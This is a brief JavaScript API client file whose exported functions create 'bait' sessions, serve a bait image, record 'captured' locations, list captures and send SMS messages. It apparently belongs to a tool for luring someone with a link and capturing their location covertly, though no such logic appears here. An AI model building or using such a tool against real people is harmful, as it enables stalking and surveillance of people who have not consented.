// src/lib/api.js
import axios from 'axios';

const api = axios.create({
  baseURL: import.meta.env.VITE_API_URL || '/api',
  timeout: 15000,
});

export const createBaitSession = (data)            => api.post('/bait/create', data);
export const getBaitSession    = (sessionId)       => api.get(`/bait/${sessionId}`);
export const getBaitImage      = (sessionId)       => api.get(`/bait/${sessionId}/image`);
export const captureLocation   = (sessionId, data) => api.post(`/bait/${sessionId}/capture`, data);
export const getCaptures       = (sessionId)       => api.get(`/bait/${sessionId}/captures`);
export const sendSMS           = (sessionId, data) => api.post(`/bait/${sessionId}/sms`, data);

export default api;
